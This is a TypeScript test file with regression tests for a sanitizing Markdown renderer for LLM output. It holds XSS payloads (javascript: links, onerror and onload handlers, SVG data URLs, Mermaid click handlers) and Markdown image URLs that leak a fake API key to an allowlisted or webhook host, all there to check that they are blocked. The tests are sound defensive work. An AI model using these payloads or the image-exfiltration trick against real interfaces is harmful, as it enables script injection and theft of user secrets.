/**
 * One test per class of real-world advisory in Markdown/LLM renderers:
 *   1. sanitizing before Markdown conversion instead of after;
 *   2. an unsafe fallback when the Markdown step fails;
 *   3. SVG delivered through data: URLs;
 *   4. diagram renderers (Mermaid) run in a loose mode;
 *   5. exfiltration through a host that is on the allowlist.
 */
import { describe, expect, it } from 'vitest';
import { createRenderer } from '../src/index.js';

const box = (): HTMLDivElement => document.createElement('div');

describe('regression classes', () => {
  it('1. sanitizes after Markdown conversion: entity-encoded javascript: destinations do not survive', () => {
    const target = box();
    createRenderer().renderMarkdownInto(
      target,
      '[a](javascript&#58;alert(1)) [b](&#106;avascript:alert(1)) <a href="javascript&#x3A;alert(1)">c</a> [d](https://x.example/)',
    );
    const links = Array.from(target.querySelectorAll('a'));
    expect(links.length).toBe(4);
    expect(links.map((a) => a.getAttribute('href'))).toEqual([null, null, null, 'https://x.example/']);
  });

  it('2. falls back to plain text, not raw HTML, when the Markdown renderer throws', () => {
    const target = box();
    const input = '<img src=x onerror=alert(1)> **bold**';
    const renderer = createRenderer({
      markdown: () => {
        throw new Error('parser crashed');
      },
    });
    const { decisions } = renderer.renderMarkdownInto(target, input);
    expect(target.querySelector('img, strong')).toBeNull();
    expect(target.textContent).toBe(input);
    expect(decisions[0]?.subject).toBe('markdown');
    expect(String(renderer.markdownToTrustedHTML(input))).not.toContain('<img');
    expect(renderer.markdownToFragment(input).fragment.textContent).toBe(input);
  });

  it('3. blocks SVG delivered through data: URLs in any mode', () => {
    const svg = 'data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22alert(1)%22%2F%3E';
    for (const mode of ['strict', 'balanced', 'permissive'] as const) {
      const target = box();
      createRenderer({ mode }).renderMarkdownInto(target, `![x](${svg}) <img src="data:image/svg+xml;base64,PHN2Zy8+"> <object data="${svg}"></object>`);
      expect(target.querySelector('img, object, svg'), mode).toBeNull();
      expect(target.querySelector('[src], [data]'), mode).toBeNull();
    }
  });

  it('4. keeps Mermaid blocks as text: no diagram renderer, no loose-mode click handlers', () => {
    const target = box();
    createRenderer().renderMarkdownInto(target, '```mermaid\ngraph TD\nA-->B\nclick A href "javascript:alert(1)"\n```');
    const code = target.querySelector('pre > code.language-mermaid');
    expect(code?.textContent).toContain('click A href "javascript:alert(1)"');
    expect(target.querySelector('a, svg')).toBeNull();
  });

  it('5. stops exfiltration through an allowlisted host: query stripped, encoded path blocked', () => {
    const target = box();
    const secret = encodeURIComponent('user said: my API key is sk-live-123');
    const encoded = Buffer.from('user said: my API key is sk-live-123 '.repeat(4)).toString('base64url');
    createRenderer({ policy: { imageHosts: ['cdn.example'] } }).renderMarkdownInto(
      target,
      `![a](https://cdn.example/pixel.png?c=${secret}) ![b](https://cdn.example/${encoded}.png)`,
    );
    const images = Array.from(target.querySelectorAll('img'));
    expect(images.map((i) => i.getAttribute('src'))).toEqual(['https://cdn.example/pixel.png']);
    expect(target.querySelectorAll('a.rp-blocked-image').length).toBe(1);
    expect(target.innerHTML).not.toContain('sk-live');
  });

  it('raw HTML inside Markdown goes through the same policy', () => {
    const target = box();
    createRenderer().renderMarkdownInto(target, 'text\n\n<div onclick="x()" class="hidden" style="display:none">raw</div>\n\n<form><input></form>');
    const div = target.querySelector('div');
    expect(div?.attributes.length).toBe(0);
    expect(target.querySelector('form, input')).toBeNull();
  });

  it('the placeholder for a blocked image obeys the policy too', () => {
    const target = box();
    createRenderer().renderMarkdownInto(target, '![leak](https://webhook.site/x.png)');
    const placeholder = target.querySelector('a.rp-blocked-image');
    expect(placeholder).not.toBeNull();
    expect(placeholder?.hasAttribute('href')).toBe(false);
  });
});
